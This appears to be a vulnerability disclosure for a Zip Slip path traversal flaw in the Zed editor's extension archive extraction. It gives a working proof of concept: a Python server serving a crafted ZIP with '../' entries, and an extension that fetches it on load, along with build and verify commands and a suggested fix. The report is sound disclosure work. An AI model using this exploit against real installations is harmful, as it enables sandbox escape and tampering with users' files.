## Summary

A **Zip Slip (Path Traversal)** vulnerability exists in Zed's extension archive extraction functionality. The `extract_zip()` function in `crates/util/src/archive.rs` fails to validate ZIP entry filenames for path traversal sequences (e.g., `../`). This allows a malicious extension to write files **outside its designated sandbox directory** by downloading and extracting a crafted ZIP archive.

**Severity:** High (CVSS 7.5-8.5)
**CWE:** CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

---

## Details

### Vulnerable Code Location

The vulnerability exists in two places within `crates/util/src/archive.rs`:

**Windows implementation (lines 20-25):**

```rust
let path = destination.join(
    entry
        .filename()
        .as_str()
        .context("reading zip entry file name")?,
);
```

**Unix implementation (lines 82-87):**

```rust
let path = destination.join(
    entry
        .filename()
        .as_str()
        .context("reading zip entry file name")?,
);
```

### Root Cause

The code joins the destination path with the raw ZIP entry filename from `entry.filename().as_str()` without validating that:

1. The filename doesn't contain `../` path traversal sequences
2. The resulting path remains within the destination directory

This is then passed directly to `std::fs::create_dir_all()` and `smol::fs::File::create()`, allowing files to be written outside the intended extraction directory.

### Why Existing Sandbox Validation Doesn't Help

Zed does implement sandbox validation via `writeable_path_from_extension()` in `crates/extension_host/src/wasm_host.rs`:

```rust
pub fn writeable_path_from_extension(&self, id: &Arc<str>, path: &Path) -> Result<PathBuf> {
    let extension_work_dir = self.work_dir.join(id.as_ref());
    let path = normalize_path(&extension_work_dir.join(path));
    anyhow::ensure!(
        path.starts_with(&extension_work_dir),
        "cannot write to path {path:?}",
    );
    Ok(path)
}
```

However, this validation only applies to the **destination directory** parameter passed by the extension, not to individual filenames within the ZIP archive. The attack exploits this gap:

1. Extension calls `download_file(url, "tool", Zip)`
2. `writeable_path_from_extension()` validates `"tool"` → passes ✓
3. ZIP is extracted, but entry filenames like `../escaped.txt` are not validated
4. Files escape the intended directory

### Library Note

Zed uses `async_zip = "0.0.18"`. The maintainers of this library have explicitly stated they will not implement Zip Slip protections—developers must implement their own validation.

---

## PoC

### Prerequisites

- Zed installed
- Python 3 (for the malicious HTTP server)
- Rust toolchain (for building the extension)

### Step 1: Create the Malicious HTTP Server

Create a file `malicious_server.py`:

```python
#!/usr/bin/env python3
"""Malicious HTTP server serving a crafted ZIP with path traversal entries."""

import http.server
import socketserver
import io
import zipfile
from datetime import datetime

PORT = 8888

MALICIOUS_ENTRIES = [
    ("README.txt", b"Legitimate file."),
    ("../escaped_level1.txt", b"[EXPLOIT] Escaped one level!"),
    ("../../escaped_level2.txt", b"[EXPLOIT] Escaped two levels - outside extension sandbox!"),
]

def create_malicious_zip():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for filename, content in MALICIOUS_ENTRIES:
            info = zipfile.ZipInfo(filename)
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, content)
    buffer.seek(0)
    return buffer.getvalue()

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        zip_data = create_malicious_zip()
        self.send_response(200)
        self.send_header("Content-Type", "application/zip")
        self.send_header("Content-Length", len(zip_data))
        self.end_headers()
        self.wfile.write(zip_data)
        print(f"[{datetime.now()}] Served malicious ZIP")

if __name__ == "__main__":
    print(f"Malicious server running on http://127.0.0.1:{PORT}/")
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        httpd.serve_forever()
```

Run it:

```bash
python3 malicious_server.py
```

**Output:**

```
Malicious server running on http://127.0.0.1:8888/
```

### Step 2: Create the Malicious Extension

Create the following directory structure:

```
malicious-extension/
├── Cargo.toml
├── extension.toml
├── languages/
│   └── plaintext/
│       └── config.toml
└── src/
    └── zipslip_poc.rs
```

**Cargo.toml:**

```toml
[package]
name = "zipslip-poc"
version = "0.1.0"
edition = "2021"

[workspace]

[lib]
path = "src/zipslip_poc.rs"
crate-type = ["cdylib"]

[dependencies]
zed_extension_api = "0.5.0"
```

**extension.toml:**

```toml
id = "zipslip-poc"
name = "ZipSlip PoC"
description = "Proof of Concept for Zip Slip vulnerability"
version = "0.1.0"
schema_version = 1
authors = ["Security Researcher"]

[language_servers.zipslip-lsp]
name = "ZipSlip LSP"
language = "Plain Text"

[[capabilities]]
kind = "download_file"
host = "*"
path = ["**"]
```

**src/zipslip_poc.rs:**

```rust
use zed_extension_api::{self as zed, DownloadedFileType, LanguageServerId, Result};

struct ZipSlipExtension;

impl ZipSlipExtension {
    fn trigger_exploit(&self) -> Result<()> {
        // Download malicious ZIP from attacker-controlled server
        zed::download_file(
            "http://127.0.0.1:8888/malicious.zip",
            "exploit-test",
            DownloadedFileType::Zip
        )
    }
}

impl zed::Extension for ZipSlipExtension {
    fn new() -> Self {
        let ext = Self;
        let _ = ext.trigger_exploit();  // Trigger on extension load
        ext
    }

    fn language_server_command(
        &mut self,
        _language_server_id: &LanguageServerId,
        _worktree: &zed::Worktree,
    ) -> Result<zed::Command> {
        Err("PoC extension".to_string())
    }
}

zed::register_extension!(ZipSlipExtension);
```

**languages/plaintext/config.toml:**

```toml
name = "Plain Text"
grammar = "plaintext"
path_suffixes = ["txt"]
```

### Step 3: Install the Extension in Zed

1. Build the extension:

```bash
cd malicious-extension
rustup target add wasm32-wasip1
cargo build --target wasm32-wasip1 --release
```

2. In Zed, open Command Palette (`Cmd+Shift+P` / `Ctrl+Shift+P`)
3. Run: `zed: install dev extension`
4. Select the `malicious-extension` directory

### Step 4: Verify the Exploit

Check the extensions work directory for escaped files:

**macOS:**

```bash
ls -la ~/Library/Application\ Support/Zed/extensions/work/
```

**Linux:**

```bash
ls -la ~/.local/share/zed/extensions/work/
```

**Expected Output:**

```
total 8
drwxr-xr-x  5 user  staff  160 Dec 28 16:49 .
drwxr-xr-x  7 user  staff  224 Dec 28 16:49 ..
-rw-------  1 user  staff   70 Dec 28 16:50 escaped_level2.txt   ← ESCAPED!
drwxr-xr-x  4 user  staff  128 Dec 28 16:49 zipslip-poc
```

**Verify the escaped file content:**

```bash
cat ~/Library/Application\ Support/Zed/extensions/work/escaped_level2.txt
```

**Output:**

```
[EXPLOIT] Escaped two levels - outside extension sandbox!
```

### Result

The file `escaped_level2.txt` is written to the `work/` directory, **outside** the extension's designated `zipslip-poc/` subdirectory. This proves arbitrary file write outside the extension sandbox.

### Video Demonstration

![Zed Zip Slip PoC Demonstration](https://github.com/user-attachments/assets/f40ce747-679a-4b03-94ca-f8b8432d8da4)


> **Note:** The GIF above shows the complete exploit chain...


---

## Impact

### Who is Affected

- All Zed users who install third-party extensions
- Extensions can download ZIP files from any URL (with appropriate capability)
- No user interaction required beyond installing the extension

### Attack Scenarios

1. **Configuration Tampering:** Overwrite Zed settings files to modify editor behavior
2. **Credential Theft:** Write malicious files to locations that may be executed or sourced
3. **Supply Chain Attacks:** A compromised extension repository could distribute malicious extensions
4. **Sandbox Escape:** Bypass Zed's extension isolation security model

### Severity Justification

- **Attack Complexity:** Low (requires user to install extension)
- **Privileges Required:** Low (user must install extension)
- **User Interaction:** Required (install extension)
- **Scope:** Changed (escapes extension sandbox)
- **Integrity Impact:** High (arbitrary file modification)

---

## Recommended Fix

Add path traversal validation in `crates/util/src/archive.rs` before file creation:

```rust
let entry_filename = entry
    .filename()
    .as_str()
    .context("reading zip entry file name")?;

// Reject entries with path traversal sequences
if entry_filename.contains("..") || entry_filename.starts_with('/') {
    anyhow::bail!(
        "Zip entry contains invalid path components: {}",
        entry_filename
    );
}

let path = destination.join(entry_filename);

// Double-check: ensure resulting path is within destination
let canonical_destination = destination.canonicalize()?;
let canonical_path = fs::normalize_path(&path);
if !canonical_path.starts_with(&canonical_destination) {
    anyhow::bail!(
        "Zip entry would escape destination directory: {:?}",
        entry_filename
    );
}
```

This validation should be applied in both the Windows (line 20) and Unix (line 82) implementations.

---

## References

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [Snyk Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
- [CVE-2025-29787 - Rust zip crate Path Traversal](https://nvd.nist.gov/vuln/detail/CVE-2025-29787)
- [GHSA-9mgg-f37v-jw2r - async_zip advisory](https://github.com/Majored/rs-async-zip/issues/100)

---

Thank you for your attention to this security matter. I'm happy to provide additional details or assist with testing a fix. Please let me know if you have any questions!
